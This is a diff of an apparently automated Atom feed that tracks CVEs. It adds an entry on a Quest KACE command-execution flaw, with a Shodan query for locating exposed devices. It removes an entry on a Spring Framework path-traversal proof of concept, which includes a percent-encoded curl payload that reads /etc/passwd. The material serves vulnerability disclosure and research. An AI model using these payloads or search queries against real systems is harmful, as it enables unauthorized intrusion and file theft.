@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-25T10:45:12.591Z</updated>
+  <updated>2025-06-25T11:00:18.952Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,32 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Quest KACE System Management Appliance 任意命令执行漏洞</title>
+    <link href="http://example.com/2025/06/25/github_1057633275/"/>
+    <id>http://example.com/2025/06/25/github_1057633275/</id>
+    <published>2025-06-25T11:00:18.957Z</published>
+    <updated>2025-06-25T11:00:18.952Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Quest KACE System Management Appliance 任意命令执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2018-11138</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Quest KACE System Management Appliance 8.0.318中的’&#x2F;common&#x2F;download_agent_installer.php’脚本允许匿名用户访问，可被滥用以在系统上执行任意命令。</p><p><strong>产品厂商：</strong> Quest</p><p><strong>产品名称：</strong> KACE System Management Appliance</p><p><strong>影响版本：</strong> 8.0.318</p><p><strong>搜索语法：</strong> http.title:”kace systems management”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/issues/12468">https://github.com/projectdiscovery/nuclei-templates/issues/12468</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h4 id="Description"><a href="#Description" class="headerlink" title="Description:"></a>Description:</h4><blockquote><p>The ‘&#x2F;common&#x2F;download_agent_installer.php’ script in the Quest KACE System Management Appliance 8.0.318 is accessible by anonymous users and can be abused to execute arbitrary commands on the system.</p></blockquote><h5 id="Severity-Critical"><a href="#Severity-Critical" class="headerlink" title="Severity: Critical"></a>Severity: <code>Critical</code></h5><h5 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h5><ul><li><a href="https://www.coresecurity.com/advisories/quest-kace-system-management-appliance-multiple-vulnerabilities">https://www.coresecurity.com/advisories/quest-kace-system-management-appliance-multiple-vulnerabilities</a></li><li><a href="https://www.exploit-db.com/exploits/44950/">https://www.exploit-db.com/exploits/44950/</a></li></ul><h4 id="KEV-True"><a href="#KEV-True" class="headerlink" title="KEV: True"></a>KEV: True</h4><h4 id="Shodan-Query-http-title-kace-systems-management"><a href="#Shodan-Query-http-title-kace-systems-management" class="headerlink" title="Shodan Query: http.title:&quot;kace systems management&quot;"></a>Shodan Query: <code>http.title:&quot;kace systems management&quot;</code></h4><blockquote><p>Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(<code>-debug</code>) along with the template to help the triage team with validation or can also share a vulnerable environment like docker file. </p></blockquote><blockquote><p>Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding code templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates with other protocols unless exceptions are made.</p></blockquote><p>You can check the FAQ for the Nuclei Templates Community Rewards Program <a href="https://github.com/projectdiscovery/nuclei-templates/blob/main/Community-Rewards-FAQ.md">here</a>.</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Quest KACE System Management Appliance </summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+  </entry>
   
   <entry>
     <title>Linux Image CVE-2025-27558 Vulnerability</title>
@@ -521,33 +547,6 @@
     
     
     <category term="attackerkb.com" scheme="http://example.com/tags/attackerkb-com/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Spring Framework 路径遍历漏洞</title>
-    <link href="http://example.com/2025/06/25/github_2754194582/"/>
-    <id>http://example.com/2025/06/25/github_2754194582/</id>
-    <published>2025-06-25T07:15:14.471Z</published>
-    <updated>2025-06-25T07:15:14.469Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Spring Framework 路径遍历漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2024-38819</li></ul><p><strong>漏洞类型：</strong> 目录遍历</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> Spring Framework 6.1.13版本中存在一个路径遍历漏洞，攻击者可以通过构造特定的URL路径，利用百分号编码绕过安全限制，访问系统上的任意文件，如&#x2F;etc&#x2F;passwd。该漏洞通过静态文件路由和符号链接的组合被利用，可能导致敏感信息泄露。</p><p><strong>产品厂商：</strong> Spring</p><p><strong>产品名称：</strong> Spring Framework</p><p><strong>影响版本：</strong> 6.1.13</p><p><strong>来源：</strong> <a href="https://github.com/vishalnoza/CVE-2024-38819-POC2">https://github.com/vishalnoza/CVE-2024-38819-POC2</a></p><p><strong>类型：</strong> CVE-2024:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>LICENSE</li><li>README.md</li><li>safe</li><li>vuln</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CVE-2024-38819-Proof-of-Concept-PoC"><a href="#CVE-2024-38819-Proof-of-Concept-PoC" class="headerlink" title="CVE-2024-38819: Proof of Concept (PoC)"></a>CVE-2024-38819: Proof of Concept (PoC)</h2><p>This is a proof of concept for the <a href="https://spring.io/security/cve-2024-38819">CVE-2024-38819</a> vulnerability, which I reported, demonstrating a path traversal exploit.</p><h3 id="Execution-Steps"><a href="#Execution-Steps" class="headerlink" title="Execution Steps"></a>Execution Steps</h3><ol><li>Build the Docker image (Spring Boot 3.3.4, based on Spring Framework 6.1.13)<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cd</span> vuln<br><span class="hljs-attribute">docker</span> build -t cve-<span class="hljs-number">2024</span>-<span class="hljs-number">38819</span>-poc .<br></code></pre></td></tr></table></figure></li><li>Run the container and expose port 8080 to the host machine<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> run -d -p <span class="hljs-number">8080</span>:<span class="hljs-number">8080</span> --name cve-<span class="hljs-number">2024</span>-<span class="hljs-number">38819</span>-poc cve-<span class="hljs-number">2024</span>-<span class="hljs-number">38819</span>-poc<br></code></pre></td></tr></table></figure></li><li>Run the following command to execute the PoC and confirm the vulnerability<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">curl</span> http://localhost:<span class="hljs-number">8080</span>/static/link/%<span class="hljs-number">2</span>e%<span class="hljs-number">2</span>e/etc/passwd<br></code></pre></td></tr></table></figure>If the attack is successful, the contents of the <code>/etc/passwd</code> file will be displayed.</li></ol><h3 id="Explanation"><a href="#Explanation" class="headerlink" title="Explanation"></a>Explanation</h3><ol><li><p>Create <code>PathTraversalDemoApplication.java</code> with the following code to set up static file routing using <code>RouterFunction</code> and <code>FileSystemResource</code>:</p> <figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-keyword">public</span> RouterFunction&lt;ServerResponse&gt; <span class="hljs-title">staticResourceRouter</span>()</span> &#123;<br>    <span class="hljs-keyword">return</span> RouterFunctions.resources(<span class="hljs-string">&quot;/static/**&quot;</span>, <span class="hljs-keyword">new</span> FileSystemResource(<span class="hljs-string">&quot;/app/static/&quot;</span>));<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>Add the following command to the Dockerfile to create a symbolic link:</p> <figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">ln</span> -s /static /app/static/link</span><br></code></pre></td></tr></table></figure></li><li><p>Create a payload that leverages percent-encoding to traverse directories through the symbolic link.</p><ul><li>Path: <code>/static/link/%2e%2e/etc/passwd</code></li></ul></li><li><p>Use the following <code>curl</code> command to execute the PoC and verify if the attack is successful:</p> <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">curl</span> http://localhost:<span class="hljs-number">8080</span>/static/link/%<span class="hljs-number">2</span>e%<span class="hljs-number">2</span>e/etc/passwd<br></code></pre></td></tr></table></figure><p>If the attack is successful, the contents of the <code>/etc/passwd</code> file will be displayed.</p></li></ol><h3 id="Disclaimer"><a href="#Disclaimer" class="headerlink" title="Disclaimer"></a>Disclaimer</h3><p>This PoC is provided for educational and security research purposes. Before using this in a real system, ensure the vulnerability has been fixed and you have proper authorization. The author takes no responsibility for any misuse of this code.</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Spring Framework 路径遍历漏洞&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="CVE-2024:github search" scheme="http://example.com/tags/CVE-2024-github-search/"/>
-    
-    <category term="目录遍历" scheme="http://example.com/tags/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/"/>
     
   </entry>
   
